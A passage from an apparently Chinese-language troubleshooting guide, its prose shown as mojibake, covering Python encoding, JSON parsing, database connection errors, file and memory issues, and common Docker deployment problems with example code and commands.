# ä½¿ç”¨æ£€æµ‹åˆ°çš„ç¼–ç è¯»å–
with open('file.txt', 'r', encoding=encoding) as f:
    content = f.read()
</code></pre>
<h4>2. å¤„ç†ç½‘é¡µç¼–ç </h4>
<pre><code class="language-python">import requests
from chardet import detect

response = requests.get(url)

# æ–¹æ³• 1: è®© requests è‡ªåŠ¨æ£€æµ‹
response.encoding = response.apparent_encoding
text = response.text

# æ–¹æ³• 2: æ‰‹åŠ¨æ£€æµ‹
encoding = detect(response.content)['encoding']
text = response.content.decode(encoding, errors='ignore')

# æ–¹æ³• 3: å°è¯•å¸¸è§ç¼–ç 
encodings = ['utf-8', 'gbk', 'gb2312', 'gb18030', 'big5']
for enc in encodings:
    try:
        text = response.content.decode(enc)
        break
    except UnicodeDecodeError:
        continue
</code></pre>
<h4>3. å¿½ç•¥é”™è¯¯å­—ç¬¦</h4>
<pre><code class="language-python"># å¿½ç•¥æ— æ³•è§£ç çš„å­—ç¬¦
text = data.decode('utf-8', errors='ignore')

# æˆ–æ›¿æ¢ä¸º ?
text = data.decode('utf-8', errors='replace')

# æˆ–ä½¿ç”¨æ›¿ä»£æ–¹æ¡ˆ
text = data.decode('utf-8', errors='backslashreplace')
</code></pre>
<h3>UnicodeEncodeError</h3>
<p><strong>é—®é¢˜è¡¨ç°</strong>:</p>
<pre><code class="language-python">UnicodeEncodeError: 'ascii' codec can't encode character '\u4e2d'
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-python"># å†™å…¥æ–‡ä»¶æ—¶æŒ‡å®šç¼–ç 
with open('output.txt', 'w', encoding='utf-8') as f:
    f.write(chinese_text)

# æ‰“å°åˆ°æ§åˆ¶å° (Windows)
import sys
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# JSON è¾“å‡ºä¿ç•™ä¸­æ–‡
import json
json.dumps(data, ensure_ascii=False, indent=2)
</code></pre>
<hr />
<h2>JSON è§£æå¤±è´¥</h2>
<h3>JSONDecodeError</h3>
<p><strong>é—®é¢˜è¡¨ç°</strong>:</p>
<pre><code class="language-python">json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
</code></pre>
<p><strong>åŸå› åˆ†æ</strong>:</p>
<ol>
<li>å“åº”ä¸æ˜¯ JSON æ ¼å¼</li>
<li>JSON æ ¼å¼é”™è¯¯</li>
<li>ç©ºå“åº”</li>
<li>HTML é”™è¯¯é¡µé¢</li>
</ol>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<h4>1. æ£€æŸ¥å“åº”å†…å®¹</h4>
<pre><code class="language-python">import requests
import json

response = requests.get(url)

# å…ˆæ£€æŸ¥çŠ¶æ€ç 
if response.status_code != 200:
    print(f&quot;Error: {response.status_code}&quot;)
    print(response.text)
    exit()

# æ£€æŸ¥ Content-Type
content_type = response.headers.get('Content-Type', '')
if 'application/json' not in content_type:
    print(f&quot;Warning: Content-Type is {content_type}&quot;)

# å®‰å…¨è§£æ
try:
    data = response.json()
except json.JSONDecodeError as e:
    print(f&quot;JSON Parse Error: {e}&quot;)
    print(f&quot;Response text: {response.text[:500]}&quot;)  # æ‰“å°å‰500å­—ç¬¦
    data = None
</code></pre>
<h4>2. å¤„ç†ç•¸å½¢ JSON</h4>
<pre><code class="language-python">import json5  # pip install json5

# json5 å¯ä»¥è§£æå¸¦æ³¨é‡Šã€å°¾éšé€—å·çš„ JSON
text = '''
{
    &quot;name&quot;: &quot;value&quot;,  // æ³¨é‡Š
    &quot;items&quot;: [1, 2, 3,],  // å°¾éšé€—å·
}
'''

data = json5.loads(text)
</code></pre>
<h4>3. ä¿®å¤å¸¸è§ JSON é—®é¢˜</h4>
<pre><code class="language-python">import re
import json

def fix_json(text):
    &quot;&quot;&quot;ä¿®å¤å¸¸è§çš„ JSON é—®é¢˜&quot;&quot;&quot;
    # ç§»é™¤ JavaScript æ³¨é‡Š
    text = re.sub(r'//.*?\n', '\n', text)
    text = re.sub(r'/\*.*?\*/', '', text, flags=re.DOTALL)

    # ç§»é™¤å°¾éšé€—å·
    text = re.sub(r',\s*}', '}', text)
    text = re.sub(r',\s*]', ']', text)

    # å•å¼•å·è½¬åŒå¼•å· (è°¨æ…ä½¿ç”¨)
    # text = text.replace(&quot;'&quot;, '&quot;')

    return text

# ä½¿ç”¨
text = response.text
fixed_text = fix_json(text)
data = json.loads(fixed_text)
</code></pre>
<h4>4. ä» HTML ä¸­æå– JSON</h4>
<pre><code class="language-python">import re
import json
from bs4 import BeautifulSoup

html = response.text

# æ–¹æ³• 1: ä» script æ ‡ç­¾æå–
soup = BeautifulSoup(html, 'lxml')
script = soup.find('script', {'id': 'initial-data'})
if script:
    data = json.loads(script.string)

# æ–¹æ³• 2: ä½¿ç”¨æ­£åˆ™æå–
match = re.search(r'var\s+data\s*=\s*({.*?});', html, re.DOTALL)
if match:
    json_str = match.group(1)
    data = json.loads(json_str)

# æ–¹æ³• 3: æå– JSON-LD
script = soup.find('script', {'type': 'application/ld+json'})
if script:
    data = json.loads(script.string)
</code></pre>
<hr />
<h2>æ•°æ®åº“è¿æ¥é—®é¢˜</h2>
<h3>MongoDB è¿æ¥å¤±è´¥</h3>
<p><strong>é—®é¢˜è¡¨ç°</strong>:</p>
<pre><code class="language-python">ServerSelectionTimeoutError: localhost:27017: [Errno 111] Connection refused
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-python">import pymongo
from pymongo.errors import ServerSelectionTimeoutError

# æ·»åŠ è¶…æ—¶å’Œé”™è¯¯å¤„ç†
try:
    client = pymongo.MongoClient(
        'mongodb://localhost:27017/',
        serverSelectionTimeoutMS=5000,
        connectTimeoutMS=5000,
        socketTimeoutMS=5000
    )

    # æµ‹è¯•è¿æ¥
    client.server_info()
    print(&quot;âœ… MongoDB connected&quot;)

except ServerSelectionTimeoutError as e:
    print(f&quot;âŒ MongoDB connection failed: {e}&quot;)
    print(&quot;æç¤º:&quot;)
    print(&quot;1. æ£€æŸ¥ MongoDB æ˜¯å¦è¿è¡Œ: systemctl status mongod&quot;)
    print(&quot;2. æ£€æŸ¥ç«¯å£: netstat -an | grep 27017&quot;)
    print(&quot;3. æ£€æŸ¥é˜²ç«å¢™è®¾ç½®&quot;)
    exit()
</code></pre>
<h4>è®¤è¯é—®é¢˜</h4>
<pre><code class="language-python"># å¸¦è®¤è¯çš„è¿æ¥
client = pymongo.MongoClient(
    'mongodb://username:password@localhost:27017/',
    authSource='admin',  # è®¤è¯æ•°æ®åº“
    authMechanism='SCRAM-SHA-256'  # è®¤è¯æœºåˆ¶
)

# æˆ–ä½¿ç”¨ URI æ ¼å¼
uri = 'mongodb://username:password@host1:27017,host2:27017/database?authSource=admin'
client = pymongo.MongoClient(uri)
</code></pre>
<h3>MySQL è¿æ¥é—®é¢˜</h3>
<p><strong>é—®é¢˜è¡¨ç°</strong>:</p>
<pre><code class="language-python">Error 2003: Can't connect to MySQL server on 'localhost'
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-python">import mysql.connector
from mysql.connector import Error

try:
    connection = mysql.connector.connect(
        host='localhost',
        port=3306,
        database='testdb',
        user='root',
        password='password',
        connect_timeout=10,
        autocommit=True,
        charset='utf8mb4'
    )

    if connection.is_connected():
        db_info = connection.get_server_info()
        print(f&quot;âœ… Connected to MySQL Server version {db_info}&quot;)

except Error as e:
    print(f&quot;âŒ Error: {e}&quot;)
    print(&quot;æ£€æŸ¥é¡¹:&quot;)
    print(&quot;1. MySQL æœåŠ¡æ˜¯å¦è¿è¡Œ&quot;)
    print(&quot;2. ç”¨æˆ·åå¯†ç æ˜¯å¦æ­£ç¡®&quot;)
    print(&quot;3. æ˜¯å¦å…è®¸è¿œç¨‹è¿æ¥&quot;)
    print(&quot;4. é˜²ç«å¢™è®¾ç½®&quot;)

finally:
    if connection and connection.is_connected():
        connection.close()
</code></pre>
<h3>Redis è¿æ¥é—®é¢˜</h3>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-python">import redis
from redis.exceptions import ConnectionError

try:
    r = redis.Redis(
        host='localhost',
        port=6379,
        password='password',  # å¦‚æœæœ‰å¯†ç 
        db=0,
        decode_responses=True,
        socket_connect_timeout=5,
        socket_timeout=5
    )

    # æµ‹è¯•è¿æ¥
    r.ping()
    print(&quot;âœ… Redis connected&quot;)

except ConnectionError as e:
    print(f&quot;âŒ Redis connection failed: {e}&quot;)
except redis.AuthenticationError:
    print(&quot;âŒ Redis authentication failed&quot;)
</code></pre>
<hr />
<h2>æ–‡ä»¶è¯»å†™é”™è¯¯</h2>
<h3>æ–‡ä»¶ä¸å­˜åœ¨</h3>
<p><strong>é—®é¢˜è¡¨ç°</strong>:</p>
<pre><code class="language-python">FileNotFoundError: [Errno 2] No such file or directory: 'data.txt'
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-python">import os
from pathlib import Path

# æ–¹æ³• 1: æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨
file_path = 'data.txt'
if os.path.exists(file_path):
    with open(file_path, 'r') as f:
        content = f.read()
else:
    print(f&quot;File not found: {file_path}&quot;)

# æ–¹æ³• 2: ä½¿ç”¨ Path å¯¹è±¡
file_path = Path('data.txt')
if file_path.exists():
    content = file_path.read_text(encoding='utf-8')

# æ–¹æ³• 3: åˆ›å»ºç›®å½•
output_dir = Path('output/data')
output_dir.mkdir(parents=True, exist_ok=True)

# æ–¹æ³• 4: ä½¿ç”¨ç»å¯¹è·¯å¾„
from pathlib import Path
base_dir = Path(__file__).resolve().parent
file_path = base_dir / 'data' / 'file.txt'
</code></pre>
<h3>æƒé™é”™è¯¯</h3>
<p><strong>é—®é¢˜è¡¨ç°</strong>:</p>
<pre><code class="language-python">PermissionError: [Errno 13] Permission denied: '/var/log/app.log'
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-bash"># Linux/Mac
# 1. ä¿®æ”¹æ–‡ä»¶æƒé™
chmod 666 /var/log/app.log

# 2. ä¿®æ”¹ç›®å½•æƒé™
chmod 777 /var/log/

# 3. ä¿®æ”¹æ‰€æœ‰è€…
sudo chown $USER:$USER /var/log/app.log

# 4. ä½¿ç”¨ç”¨æˆ·ç›®å½•
# åœ¨ä»£ç ä¸­ä½¿ç”¨ ~/data/ è€Œä¸æ˜¯ /var/log/
</code></pre>
<pre><code class="language-python"># ä½¿ç”¨ç”¨æˆ·ç›®å½•
from pathlib import Path

home = Path.home()
log_dir = home / '.myapp' / 'logs'
log_dir.mkdir(parents=True, exist_ok=True)

log_file = log_dir / 'app.log'
</code></pre>
<hr />
<h2>å†…å­˜é—®é¢˜</h2>
<h3>å†…å­˜æº¢å‡º</h3>
<p><strong>é—®é¢˜è¡¨ç°</strong>:</p>
<pre><code class="language-python">MemoryError
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<h4>1. åˆ†æ‰¹å¤„ç†å¤§æ–‡ä»¶</h4>
<pre><code class="language-python"># ä¸è¦ä¸€æ¬¡æ€§è¯»å–æ•´ä¸ªæ–‡ä»¶
# âŒ é”™è¯¯æ–¹å¼
with open('huge_file.txt', 'r') as f:
    content = f.read()  # å¯èƒ½å¯¼è‡´å†…å­˜æº¢å‡º

# âœ… æ­£ç¡®æ–¹å¼:æŒ‰è¡Œè¯»å–
with open('huge_file.txt', 'r') as f:
    for line in f:
        process_line(line)

# æˆ–ä½¿ç”¨ç”Ÿæˆå™¨
def read_large_file(file_path, chunk_size=1024*1024):
    &quot;&quot;&quot;åˆ†å—è¯»å–å¤§æ–‡ä»¶&quot;&quot;&quot;
    with open(file_path, 'r') as f:
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            yield chunk

for chunk in read_large_file('huge_file.txt'):
    process_chunk(chunk)
</code></pre>
<h4>2. ä½¿ç”¨è¿­ä»£å™¨</h4>
<pre><code class="language-python"># âŒ ä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰æ•°æ®
urls = [f&quot;https://example.com/page/{i}&quot; for i in range(100000)]

# âœ… ä½¿ç”¨ç”Ÿæˆå™¨
def url_generator(count):
    for i in range(count):
        yield f&quot;https://example.com/page/{i}&quot;

for url in url_generator(100000):
    process_url(url)
</code></pre>
<h4>3. æ¸…ç†ä¸ç”¨çš„å¯¹è±¡</h4>
<pre><code class="language-python">import gc

# æ‰‹åŠ¨è§¦å‘åƒåœ¾å›æ”¶
gc.collect()

# åˆ é™¤å¤§å¯¹è±¡
del large_dataframe
gc.collect()
</code></pre>
<h4>4. ä½¿ç”¨æ•°æ®åº“è€Œéå†…å­˜</h4>
<pre><code class="language-python"># âŒ æ‰€æœ‰æ•°æ®å­˜åœ¨å†…å­˜ä¸­
all_data = []
for item in items:
    all_data.append(process(item))

# âœ… ç›´æ¥å­˜å…¥æ•°æ®åº“
import sqlite3

conn = sqlite3.connect('data.db')
cursor = conn.cursor()

for item in items:
    data = process(item)
    cursor.execute(&quot;INSERT INTO results VALUES (?, ?)&quot;, (data.id, data.value))
    conn.commit()
</code></pre>
<hr />
<h2>CSV å¤„ç†é—®é¢˜</h2>
<h3>ç¼–ç å’Œåˆ†éš”ç¬¦</h3>
<pre><code class="language-python">import csv
import chardet

# æ£€æµ‹ç¼–ç 
with open('data.csv', 'rb') as f:
    result = chardet.detect(f.read())
    encoding = result['encoding']

# è¯»å– CSV
with open('data.csv', 'r', encoding=encoding) as f:
    # è‡ªåŠ¨æ£€æµ‹åˆ†éš”ç¬¦
    sample = f.read(1024)
    f.seek(0)
    sniffer = csv.Sniffer()
    delimiter = sniffer.sniff(sample).delimiter

    reader = csv.DictReader(f, delimiter=delimiter)
    for row in reader:
        print(row)
</code></pre>
<h3>å¤„ç†å¤§å‹ CSV</h3>
<pre><code class="language-python">import pandas as pd

# åˆ†å—è¯»å–
chunk_size = 10000
for chunk in pd.read_csv('large.csv', chunksize=chunk_size):
    process_chunk(chunk)

# åªè¯»å–éœ€è¦çš„åˆ—
df = pd.read_csv('data.csv', usecols=['col1', 'col2'])

# æŒ‡å®šæ•°æ®ç±»å‹èŠ‚çœå†…å­˜
df = pd.read_csv('data.csv', dtype={'id': 'int32', 'value': 'float32'})
</code></pre>
<hr />
<h2>XML/HTML è§£æé—®é¢˜</h2>
<h3>è§£æå¤±è´¥</h3>
<pre><code class="language-python">from bs4 import BeautifulSoup
from lxml import etree

html = response.text

# æ–¹æ³• 1: BeautifulSoup (å®½å®¹)
soup = BeautifulSoup(html, 'lxml')  # æˆ– 'html.parser'

# æ–¹æ³• 2: lxml (ä¸¥æ ¼)
try:
    tree = etree.HTML(html)
except etree.XMLSyntaxError as e:
    print(f&quot;Parse error: {e}&quot;)

# å¤„ç†ç•¸å½¢ HTML
from lxml.html import fromstring
from lxml.html.clean import Cleaner

cleaner = Cleaner()
cleaned_html = cleaner.clean_html(html)
doc = fromstring(cleaned_html)
</code></pre>
<hr />
<h2>æ•°æ®éªŒè¯</h2>
<h3>ä½¿ç”¨ Pydantic</h3>
<pre><code class="language-python">from pydantic import BaseModel, validator, ValidationError
from typing import Optional

class Item(BaseModel):
    id: int
    name: str
    price: float
    stock: Optional[int] = 0

    @validator('price')
    def price_must_be_positive(cls, v):
        if v &lt;= 0:
            raise ValueError('Price must be positive')
        return v

# éªŒè¯æ•°æ®
try:
    item = Item(id=1, name='Product', price=19.99)
except ValidationError as e:
    print(e.json())
</code></pre>
<hr />
<h2>ğŸ“š ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-53">æ•°æ®å­˜å‚¨æ–¹æ¡ˆ</a></li>
<li><a href="#section-7">Python ç¼–ç é—®é¢˜</a></li>
<li><a href="#section-63">å¸¸ç”¨å‘½ä»¤</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-80">
                                                <h2>[R79] Docker Issues</h2>
                                                <h1>R79: Docker éƒ¨ç½²é—®é¢˜</h1>
<p>Docker å®¹å™¨åŒ–éƒ¨ç½²ä¸­çš„å¸¸è§é—®é¢˜åŠè§£å†³æ–¹æ¡ˆã€‚</p>
<hr />
<h2>å®¹å™¨å¯åŠ¨å¤±è´¥</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<pre><code class="language-bash">Error response from daemon: Container xxx exited with code 1
</code></pre>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. æŸ¥çœ‹æ—¥å¿—</h4>
<pre><code class="language-bash"># æŸ¥çœ‹å®¹å™¨æ—¥å¿—
docker logs container_name

# å®æ—¶æŸ¥çœ‹æ—¥å¿—
docker logs -f container_name

# æŸ¥çœ‹æœ€è¿‘çš„æ—¥å¿—
docker logs --tail 100 container_name

# æŸ¥çœ‹å¸¦æ—¶é—´æˆ³çš„æ—¥å¿—
docker logs -t container_name
</code></pre>
<h4>2. æ£€æŸ¥å®¹å™¨çŠ¶æ€</h4>
<pre><code class="language-bash"># æŸ¥çœ‹æ‰€æœ‰å®¹å™¨ (åŒ…æ‹¬åœæ­¢çš„)
docker ps -a

# æŸ¥çœ‹å®¹å™¨è¯¦ç»†ä¿¡æ¯
docker inspect container_name

# æŸ¥çœ‹å®¹å™¨èµ„æºä½¿ç”¨
docker stats container_name
</code></pre>
<h4>3. è¿›å…¥å®¹å™¨è°ƒè¯•</h4>
<pre><code class="language-bash"># è¿›å…¥è¿è¡Œä¸­çš„å®¹å™¨
docker exec -it container_name bash

# å¦‚æœå®¹å™¨å·²åœæ­¢,ä½¿ç”¨ä¸´æ—¶å®¹å™¨
docker run -it --rm image_name bash

# ä½¿ç”¨ sh (å¦‚æœ bash ä¸å¯ç”¨)
docker exec -it container_name sh
</code></pre>
<h4>4. æ£€æŸ¥å¯åŠ¨å‘½ä»¤</h4>
<pre><code class="language-yaml"># docker-compose.yml
services:
  app:
    image: myapp:latest
    command: python app.py  # ç¡®ä¿å‘½ä»¤æ­£ç¡®
    # æˆ–ä½¿ç”¨æ•°ç»„æ ¼å¼
    command: [&quot;python&quot;, &quot;app.py&quot;]
</code></pre>
<hr />
<h2>ç½‘ç»œè¿æ¥é—®é¢˜</h2>
<h3>å®¹å™¨æ— æ³•è®¿é—®å¤–ç½‘</h3>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-bash"># 1. æ£€æŸ¥ DNS é…ç½®
docker run --rm alpine ping google.com

# 2. æŒ‡å®š DNS æœåŠ¡å™¨
docker run --dns 8.8.8.8 --dns 8.8.4.4 myimage

# 3. docker-compose.yml ä¸­é…ç½®
services:
  app:
    dns:
      - 8.8.8.8
      - 8.8.4.4

# 4. æ£€æŸ¥ Docker ç½‘ç»œè®¾ç½®
docker network ls
docker network inspect bridge
</code></pre>
<h3>å®¹å™¨é—´æ— æ³•é€šä¿¡</h3>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-bash"># 1. ç¡®ä¿åœ¨åŒä¸€ç½‘ç»œä¸­
docker-compose.yml:
services:
  app:
    networks:
      - mynetwork
  db:
    networks:
      - mynetwork

networks:
  mynetwork:
    driver: bridge

# 2. ä½¿ç”¨æœåŠ¡åè®¿é—®
# åœ¨ app å®¹å™¨ä¸­è®¿é—® db å®¹å™¨
ping db  # è€Œä¸æ˜¯ localhost

# 3. æ£€æŸ¥é˜²ç«å¢™
sudo ufw status
sudo iptables -L

# 4. æ£€æŸ¥ç«¯å£æ˜ å°„
docker port container_name
</code></pre>
<h3>ç«¯å£å†²çª</h3>
<p><strong>é—®é¢˜è¡¨ç°</strong>:</p>
<pre><code class="language-bash">Error: Bind for 0.0.0.0:8080 failed: port is already allocated
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-bash"># 1. æŸ¥çœ‹ç«¯å£å ç”¨
lsof -i :8080  # Linux/Mac
netstat -ano | findstr :8080  # Windows

# 2. ä¿®æ”¹ç«¯å£æ˜ å°„
docker run -p 8081:8080 myimage  # ä½¿ç”¨å…¶ä»–ä¸»æœºç«¯å£

# 3. docker-compose.yml
services:
  app:
    ports:
      - &quot;8081:8080&quot;  # host:container

# 4. åœæ­¢å ç”¨ç«¯å£çš„å®¹å™¨
docker ps | grep 8080
docker stop container_name
</code></pre>
<hr />
<h2>å·æŒ‚è½½é—®é¢˜</h2>
<h3>æ–‡ä»¶æƒé™é”™è¯¯</h3>
<p><strong>é—®é¢˜è¡¨ç°</strong>:</p>
<pre><code class="language-bash">PermissionError: [Errno 13] Permission denied: '/app/data/file.txt'
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-dockerfile"># 1. Dockerfile ä¸­è®¾ç½®æ­£ç¡®çš„æƒé™
FROM python:3.11

WORKDIR /app

# åˆ›å»ºé root ç”¨æˆ·
RUN useradd -m -u 1000 appuser &amp;&amp; \
    chown -R appuser:appuser /app

# åˆ‡æ¢ç”¨æˆ·
USER appuser

COPY --chown=appuser:appuser . .
</code></pre>
<pre><code class="language-yaml"># 2. docker-compose.yml ä¸­æŒ‡å®šç”¨æˆ·
services:
  app:
    user: &quot;1000:1000&quot; # UID:GID
    volumes:
      - ./data:/app/data
</code></pre>
<pre><code class="language-bash"># 3. ä¿®æ”¹ä¸»æœºæ–‡ä»¶æƒé™
sudo chown -R 1000:1000 ./data

# 4. åœ¨å®¹å™¨å†…ä¿®æ”¹æƒé™
docker exec -u root container_name chown -R appuser:appuser /app/data
</code></pre>
<h3>å·æŒ‚è½½å¤±è´¥</h3>
<p><strong>é—®é¢˜è¡¨ç°</strong>:</p>
<pre><code class="language-bash">Error: invalid mount config: volume driver not found
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-yaml"># 1. ä½¿ç”¨ç»å¯¹è·¯å¾„
services:
  app:
    volumes:
      - /absolute/path/to/data:/app/data  # Linux/Mac
      - C:/absolute/path/to/data:/app/data  # Windows

# 2. ä½¿ç”¨ç›¸å¯¹è·¯å¾„
services:
  app:
    volumes:
      - ./data:/app/data  # ç›¸å¯¹äº docker-compose.yml

# 3. ä½¿ç”¨å‘½åå·
services:
  app:
    volumes:
      - mydata:/app/data

volumes:
  mydata:
    driver: local

# 4. Windows è·¯å¾„è½¬æ¢
# Windows ä¸‹éœ€è¦å…±äº«é©±åŠ¨å™¨
# Docker Desktop â†’ Settings â†’ Resources â†’ File Sharing
</code></pre>
<hr />
<h2>é•œåƒæ„å»ºé—®é¢˜</h2>
<h3>æ„å»ºé€Ÿåº¦æ…¢</h3>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-dockerfile"># 1. ä½¿ç”¨å¤šé˜¶æ®µæ„å»º
FROM python:3.11 AS builder
WORKDIR /app
COPY requirements.txt .
RUN pip install --user -r requirements.txt

FROM python:3.11-slim
WORKDIR /app
COPY --from=builder /root/.local /root/.local
COPY . .
ENV PATH=/root/.local/bin:$PATH

# 2. ä¼˜åŒ–å±‚ç¼“å­˜
# æŠŠä¸å¸¸å˜çš„æŒ‡ä»¤æ”¾å‰é¢
FROM python:3.11
WORKDIR /app

# å…ˆå¤åˆ¶ä¾èµ–æ–‡ä»¶
COPY requirements.txt .
RUN pip install -r requirements.txt

# å†å¤åˆ¶ä»£ç 
COPY . .

# 3. ä½¿ç”¨ .dockerignore
.git/
__pycache__/
*.pyc
*.pyo
*.log
.env
node_modules/
</code></pre>
<pre><code class="language-bash"># 4. ä½¿ç”¨æ„å»ºç¼“å­˜
docker build --cache-from myimage:latest -t myimage:new .

# 5. ä½¿ç”¨ BuildKit
export DOCKER_BUILDKIT=1
docker build -t myimage .
</code></pre>
<h3>é•œåƒè¿‡å¤§</h3>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-dockerfile"># 1. ä½¿ç”¨æ›´å°çš„åŸºç¡€é•œåƒ
# âŒ å¤§é•œåƒ (900MB+)
FROM python:3.11

# âœ… å°é•œåƒ (100MB+)
FROM python:3.11-slim

# âœ… æ›´å°çš„é•œåƒ (50MB+)
FROM python:3.11-alpine

# 2. å¤šé˜¶æ®µæ„å»º
FROM python:3.11 AS builder
WORKDIR /build
COPY requirements.txt .
RUN pip install --prefix=/install -r requirements.txt

FROM python:3.11-slim
COPY --from=builder /install /usr/local
COPY app /app
WORKDIR /app

# 3. æ¸…ç†ç¼“å­˜
RUN apt-get update &amp;&amp; \
    apt-get install -y --no-install-recommends gcc &amp;&amp; \
    pip install -r requirements.txt &amp;&amp; \
    apt-get purge -y gcc &amp;&amp; \
    apt-get autoremove -y &amp;&amp; \
    rm -rf /var/lib/apt/lists/*

# 4. ä½¿ç”¨ .dockerignore
.git/
*.md
tests/
docs/
</code></pre>
<pre><code class="language-bash"># 5. æŸ¥çœ‹é•œåƒå±‚
docker history myimage:latest

# 6. å‹ç¼©é•œåƒ
docker export container_name | docker import - myimage:compressed
</code></pre>
<hr />
<h2>èµ„æºé™åˆ¶é—®é¢˜</h2>
<h3>å†…å­˜ä¸è¶³</h3>
<p><strong>é—®é¢˜è¡¨ç°</strong>:</p>
<pre><code class="language-bash">Container killed due to memory limit
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-yaml"># docker-compose.yml
services:
  app:
    deploy:
      resources:
        limits:
          memory: 512M
        reservations:
          memory: 256M

# æˆ–ä½¿ç”¨æ—§è¯­æ³•
services:
  app:
    mem_limit: 512m
    mem_reservation: 256m
</code></pre>
<pre><code class="language-bash"># Docker run å‘½ä»¤
docker run -m 512m --memory-reservation 256m myimage

# æŸ¥çœ‹å®¹å™¨å†…å­˜ä½¿ç”¨
docker stats container_name
</code></pre>
<h3>CPU é™åˆ¶</h3>
<pre><code class="language-yaml">services:
  app:
    deploy:
      resources:
        limits:
          cpus: '0.5'  # é™åˆ¶ä½¿ç”¨ 0.5 ä¸ª CPU
        reservations:
          cpus: '0.25'

# æˆ–
services:
  app:
    cpus: 0.5
</code></pre>
<hr />
<h2>ç¯å¢ƒå˜é‡é—®é¢˜</h2>
<h3>ç¯å¢ƒå˜é‡æœªç”Ÿæ•ˆ</h3>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-yaml"># 1. docker-compose.yml ä¸­è®¾ç½®
services:
  app:
    environment:
      - DEBUG=true
      - DB_HOST=database

# 2. ä» .env æ–‡ä»¶åŠ è½½
services:
  app:
    env_file:
      - .env
      - .env.local

# 3. ä»ä¸»æœºç¯å¢ƒç»§æ‰¿
services:
  app:
    environment:
      - HOME  # ä»ä¸»æœºç»§æ‰¿ HOME å˜é‡
</code></pre>
<pre><code class="language-bash"># 4. è¿è¡Œæ—¶æŒ‡å®š
docker run -e DEBUG=true -e DB_HOST=localhost myimage

# 5. æŸ¥çœ‹å®¹å™¨ç¯å¢ƒå˜é‡
docker exec container_name env
</code></pre>
<hr />
<h2>Docker Compose é—®é¢˜</h2>
<h3>æœåŠ¡å¯åŠ¨é¡ºåº</h3>
<p><strong>é—®é¢˜</strong>: æœåŠ¡é—´æœ‰ä¾èµ–å…³ç³»</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-yaml">services:
  app:
    depends_on:
      db:
        condition: service_healthy
      redis:
        condition: service_healthy

  db:
    healthcheck:
      test: [&quot;CMD&quot;, &quot;pg_isready&quot;, &quot;-U&quot;, &quot;postgres&quot;]
      interval: 5s
      timeout: 5s
      retries: 5

  redis:
    healthcheck:
      test: [&quot;CMD&quot;, &quot;redis-cli&quot;, &quot;ping&quot;]
      interval: 5s
      timeout: 3s
      retries: 5
</code></pre>
<h3>é…ç½®æ–‡ä»¶é‡è½½</h3>
<pre><code class="language-bash"># é‡æ–°æ„å»ºé•œåƒ
docker-compose build

# é‡æ–°åˆ›å»ºå®¹å™¨
docker-compose up -d --force-recreate

# åªé‡å¯ç‰¹å®šæœåŠ¡
docker-compose restart app

# æŸ¥çœ‹é…ç½®
docker-compose config
</code></pre>
<hr />
<h2>å¥åº·æ£€æŸ¥</h2>
<h3>é…ç½®å¥åº·æ£€æŸ¥</h3>
<pre><code class="language-dockerfile"># Dockerfile
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
  CMD curl -f http://localhost:8000/health || exit 1
</code></pre>
<pre><code class="language-yaml"># docker-compose.yml
services:
  app:
    healthcheck:
      test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost:8000/health&quot;]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s
</code></pre>
<pre><code class="language-bash"># æŸ¥çœ‹å¥åº·çŠ¶æ€
docker ps
docker inspect --format='{{.State.Health.Status}}' container_name
</code></pre>
<hr />
<h2>æ—¥å¿—ç®¡ç†</h2>
<h3>æ—¥å¿—è¿‡å¤§</h3>
<p><strong>é—®é¢˜</strong>: å®¹å™¨æ—¥å¿—å ç”¨å¤§é‡ç£ç›˜ç©ºé—´</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-yaml"># docker-compose.yml
services:
  app:
    logging:
      driver: &quot;json-file&quot;
      options:
        max-size: &quot;10m&quot;
        max-file: &quot;3&quot;
</code></pre>
<pre><code class="language-bash"># æŸ¥çœ‹æ—¥å¿—å¤§å°
du -sh /var/lib/docker/containers/*/*-json.log

# æ¸…ç†æ—¥å¿—
truncate -s 0 /var/lib/docker/containers/*/*-json.log

# å…¨å±€é…ç½® /etc/docker/daemon.json
{
  &quot;log-driver&quot;: &quot;json-file&quot;,
  &quot;log-opts&quot;: {
